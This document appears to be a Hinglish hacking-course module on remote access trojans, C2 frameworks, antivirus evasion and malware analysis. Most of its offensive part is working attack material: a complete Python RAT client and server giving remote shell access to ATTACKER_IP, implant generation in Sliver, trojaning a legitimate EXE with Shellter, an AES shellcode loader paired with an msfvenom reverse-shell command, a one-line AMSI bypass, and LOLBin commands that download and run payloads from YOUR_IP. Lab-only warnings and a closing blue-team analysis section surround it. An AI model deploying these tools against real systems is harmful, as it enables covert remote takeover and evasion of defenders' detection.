# 🔬 Phase 9 — Advanced Techniques: Malware, C2 & Evasion

> Yeh level pe tu intermediate se advanced hacker ban raha hai.
> RATs, C2 frameworks, AV evasion — red team level skills.

> [!CAUTION]
> Malware creation sirf **CONTROLLED LAB ENVIRONMENT** mein practice karo!
> Real systems pe malware deploy karna = **cybercrime** = prison!
> Yeh knowledge **defense aur analysis** ke liye zaroori hai.

---

## 🐀 Remote Access Trojans (RATs) — Understanding

### What is a RAT?

```
RAT = Remote Access Trojan
= Software that gives COMPLETE remote control of target machine

A RAT can:
├── See their screen (live)
├── Control keyboard & mouse
├── Access webcam & microphone
├── Browse file system
├── Upload/download files
├── Capture passwords
├── Log keystrokes
├── Record audio
├── Take screenshots
├── Execute commands
├── Persist after reboot
└── Spread to other machines

HOW IT WORKS:
┌──────────┐                    ┌──────────┐
│  VICTIM  │ ──── Internet ──── │ ATTACKER │
│  (RAT    │ ←── Commands ───── │  (C2     │
│  Client) │ ──── Data ───────→ │  Server) │
└──────────┘                    └──────────┘
```

### Open Source C2 Frameworks (For Learning)

```bash
# ═══════════════════════════════════════════════
# 1. SLIVER — Modern C2 Framework (Go-based)
# ═══════════════════════════════════════════════
# Best open-source C2 for learning!

# Install
curl https://sliver.sh/install | sudo bash

# Start Sliver
sudo sliver-server

# Generate implant (payload)
sliver > generate --mtls YOUR_IP --save /tmp/implant --os windows
sliver > generate --http YOUR_IP --save /tmp/implant --os linux

# Start listener
sliver > mtls --lhost YOUR_IP --lport 443

# When implant connects:
sliver > sessions              # list sessions
sliver > use SESSION_ID        # interact
sliver > shell                 # get shell
sliver > screenshot            # take screenshot
sliver > download /etc/passwd  # download file
sliver > upload payload        # upload file
sliver > portfwd add --bind 127.0.0.1:3389 --remote 10.0.0.1:3389  # port forward

# ═══════════════════════════════════════════════
# 2. MYTHIC — Advanced C2 with Web UI
# ═══════════════════════════════════════════════
# Install (requires Docker)
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic
sudo ./mythic-cli install github https://github.com/MythicAgents/apfell
sudo ./mythic-cli start

# Access web UI: https://localhost:7443
# Beautiful web interface for managing agents!

# ═══════════════════════════════════════════════
# 3. HAVOC — Modern C2 Framework
# ═══════════════════════════════════════════════
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc
make
sudo ./havoc server --profile profiles/havoc.yaotl

# Client (GUI):
./havoc client
```

### Python RAT (Educational — Lab Only!)

```python
#!/usr/bin/env python3
"""
Simple Python RAT — Educational Purpose Only!
Understand how RATs work to defend against them.
NEVER deploy on unauthorized systems!
"""
import socket
import subprocess
import os
import platform
import json

class RATClient:
    def __init__(self, server_ip, server_port):
        self.server = server_ip
        self.port = server_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def connect(self):
        """Connect to C2 server"""
        self.sock.connect((self.server, self.port))
        # Send system info on connect
        info = {
            "hostname": platform.node(),
            "os": platform.system(),
            "user": os.getlogin(),
            "arch": platform.machine()
        }
        self.sock.send(json.dumps(info).encode())
    
    def execute_command(self, command):
        """Execute shell command"""
        try:
            result = subprocess.run(
                command, shell=True,
                capture_output=True, text=True, timeout=30
            )
            return result.stdout + result.stderr
        except Exception as e:
            return str(e)
    
    def run(self):
        """Main loop — receive and execute commands"""
        self.connect()
        while True:
            try:
                command = self.sock.recv(4096).decode().strip()
                if not command:
                    break
                if command.lower() == "exit":
                    break
                
                output = self.execute_command(command)
                if not output:
                    output = "[*] Command executed (no output)"
                
                self.sock.send(output.encode())
            except Exception as e:
                self.sock.send(str(e).encode())
                break
        
        self.sock.close()

# RAT Client usage (on victim):
# client = RATClient("ATTACKER_IP", 4444)
# client.run()
```

```python
#!/usr/bin/env python3
"""
RAT Server — Control connected clients
Educational Purpose Only!
"""
import socket
import threading

class RATServer:
    def __init__(self, port):
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("0.0.0.0", port))
        self.sock.listen(5)
        self.clients = []
    
    def accept_connections(self):
        """Accept incoming RAT client connections"""
        while True:
            client, addr = self.sock.accept()
            info = client.recv(4096).decode()
            print(f"[+] New connection from {addr}: {info}")
            self.clients.append((client, addr))
    
    def send_command(self, client, command):
        """Send command to client and get response"""
        client.send(command.encode())
        response = client.recv(65536).decode()
        return response
    
    def interactive(self):
        """Interactive command shell"""
        if not self.clients:
            print("[-] No clients connected")
            return
        
        client, addr = self.clients[0]
        print(f"[*] Interacting with {addr}")
        
        while True:
            command = input(f"RAT@{addr}> ")
            if command.lower() == "exit":
                break
            if command.lower() == "background":
                break
            
            response = self.send_command(client, command)
            print(response)

# server = RATServer(4444)
# server.accept_connections()  # run in thread
# server.interactive()
```

---

## 🛡️ Antivirus Evasion Techniques

### Why AV Evasion Matters

```
Standard payloads (msfvenom) get detected by AV immediately!
To test in real engagements, you need evasion.

DETECTION METHODS:
├── Signature-based    → Known malware patterns (hash, byte patterns)
├── Heuristic         → Suspicious behavior patterns
├── Behavioral        → Runtime monitoring (sandboxing)
├── AI/ML-based       → Machine learning detection
└── Cloud-based       → Upload to cloud for analysis

EVASION METHODS:
├── Encoding/encryption → Encrypt payload
├── Obfuscation       → Make code unreadable
├── Packing           → Compress/encrypt binary
├── Process injection → Inject into legit process
├── Fileless malware  → Live only in memory!
├── Living off the land → Use built-in OS tools
├── Custom payload    → Write your own (best method!)
└── Polymorphism      → Payload changes each time
```

### Evasion Tools

```bash
# ═══════════════════════════════════════════════
# 1. Veil-Evasion — AV evasion framework
# ═══════════════════════════════════════════════
sudo apt install -y veil
sudo /usr/share/veil/config/setup.sh --force --silent

veil
# Veil> use 1 (Evasion)
# Veil/Evasion> list
# Veil/Evasion> use python/meterpreter/rev_tcp
# Set LHOST, LPORT
# generate

# ═══════════════════════════════════════════════
# 2. Shellter — Dynamic PE infector
# ═══════════════════════════════════════════════
# Inject payload into legitimate EXE
sudo apt install -y shellter
shellter
# Mode: Auto
# PE Target: legitimate_app.exe (e.g., putty.exe)
# Payload: custom or meterpreter
# Output: trojaned exe that looks legit!

# ═══════════════════════════════════════════════
# 3. Custom Encrypted Payload (Python)
# ═══════════════════════════════════════════════
```

```python
#!/usr/bin/env python3
"""
Custom encrypted payload loader
Encrypts shellcode to bypass signature detection
"""
from Crypto.Cipher import AES
import base64
import ctypes
import os

def encrypt_shellcode(shellcode, key):
    """Encrypt shellcode with AES"""
    cipher = AES.new(key.encode(), AES.MODE_CBC, iv=b'\x00'*16)
    # Pad shellcode to block size
    padded = shellcode + b'\x00' * (16 - len(shellcode) % 16)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(encrypted)

def decrypt_and_execute(encrypted_sc, key):
    """Decrypt and execute shellcode in memory"""
    cipher = AES.new(key.encode(), AES.MODE_CBC, iv=b'\x00'*16)
    shellcode = cipher.decrypt(base64.b64decode(encrypted_sc))
    
    # Execute in memory (Windows)
    # This is how fileless malware works!
    # ctypes.windll.kernel32.VirtualAlloc(...)
    # ... (execution code)

# Generate shellcode:
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o sc.bin
# Then encrypt it with this script
```

### AMSI Bypass (Windows)

```powershell
# ═══════════════════════════════════════════════
# AMSI = Antimalware Scan Interface
# PowerShell sends code to AV before execution
# Bypass AMSI → run malicious PowerShell undetected!
# ═══════════════════════════════════════════════

# Classic AMSI bypass (may need modification as signatures update):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# After bypass, malicious PowerShell runs without AV detection!
```

### Living Off the Land (LOLBins)

```bash
# ═══════════════════════════════════════════════
# Use BUILT-IN Windows tools for attacks
# No need to upload any malware!
# ═══════════════════════════════════════════════

# Download file (no browser needed):
certutil -urlcache -split -f http://YOUR_IP/payload.exe C:\Temp\payload.exe
bitsadmin /transfer myjob /download /priority high http://YOUR_IP/payload.exe C:\Temp\payload.exe
powershell -c "Invoke-WebRequest http://YOUR_IP/payload.exe -OutFile C:\Temp\payload.exe"

# Execute code:
mshta http://YOUR_IP/evil.hta
msiexec /q /i http://YOUR_IP/evil.msi
rundll32 evil.dll,EntryPoint
regsvr32 /s /n /u /i:http://YOUR_IP/evil.sct scrobj.dll

# Full reference: https://lolbas-project.github.io/
```

---

## 🔬 Malware Analysis (Blue Team Skill)

```bash
# ═══════════════════════════════════════════════
# STATIC ANALYSIS (without running the malware)
# ═══════════════════════════════════════════════

# File type identification
file suspicious_file
file -b suspicious_file

# Check strings
strings suspicious_file | less
strings -n 10 suspicious_file    # min 10 chars

# Check file hash (lookup on VirusTotal)
md5sum suspicious_file
sha256sum suspicious_file
# Search hash: https://www.virustotal.com/

# PE analysis (Windows executables)
sudo apt install -y pev
readpe suspicious.exe
pestr suspicious.exe              # extract strings from PE

# ELF analysis (Linux binaries)
readelf -a suspicious_elf
objdump -d suspicious_elf | less  # disassemble

# ═══════════════════════════════════════════════
# DYNAMIC ANALYSIS (run in sandbox!)
# ═══════════════════════════════════════════════

# Online sandboxes:
# https://any.run/           — Interactive sandbox
# https://hybrid-analysis.com/ — Free analysis
# https://www.virustotal.com/  — Multi-AV scan
# https://www.joesandbox.com/ — Detailed analysis

# Local sandbox:
# Use a VM (snapshot first!)
# Monitor with:
# - Process Monitor (Windows) — file/registry changes
# - Wireshark — network traffic
# - Regshot — registry changes before/after
# - Procmon — process activity

# Ghidra — NSA's free reverse engineering tool
sudo apt install -y ghidra
ghidra
# Load binary → Auto analysis → Read decompiled code

# Cutter (radare2 GUI)
sudo apt install -y cutter
cutter suspicious_file
```

---

## 🎥 Phase 9 Videos

```
1. "Malware Development for Ethical Hackers" — TCM Security
   https://www.youtube.com/watch?v=jfMHA7stYaU

2. "C2 Frameworks Explained" — John Hammond
   https://www.youtube.com/watch?v=dWFGc37cxJg

3. "Sliver C2 Tutorial" — IppSec
   https://www.youtube.com/watch?v=VHX_3kVLlko

4. "AV Evasion Techniques" — HackerSploit
   https://www.youtube.com/watch?v=9pwMfiK-irk

5. "Malware Analysis for Beginners" — HackerSploit
   https://www.youtube.com/watch?v=uHhKkLwT4P4

6. "Ghidra Reverse Engineering" — stacksmashing
   https://www.youtube.com/watch?v=fTGTnrgjuGA

7. "Living Off the Land" — SANS
   https://www.youtube.com/watch?v=bsJSsehslFo

8. "Red Team Operations" — TCM Security
   https://www.youtube.com/watch?v=qNGLB1X0S5k
```

---

## ✅ Phase 9 Checklist

```
C2 FRAMEWORKS
[ ] Understand C2 architecture (server, agent, listener)
[ ] Can set up Sliver or Mythic
[ ] Can generate implants/agents
[ ] Can manage sessions and execute commands

AV EVASION
[ ] Understand detection methods (signature, behavioral, AI)
[ ] Can use Veil/Shellter for basic evasion
[ ] Understand encoding and encryption
[ ] Know LOLBins for fileless attacks
[ ] Understand AMSI bypass concept

MALWARE ANALYSIS
[ ] Can do static analysis (strings, hashes, PE analysis)
[ ] Can use online sandboxes (VirusTotal, Any.run)
[ ] Can use Ghidra for basic reverse engineering
[ ] Understand malware types (RAT, ransomware, worm, etc.)
```

---

> **Phase 9 done? → [Phase 10 — Real World & Career](./Phase10_RealWorld.md)** 🌍
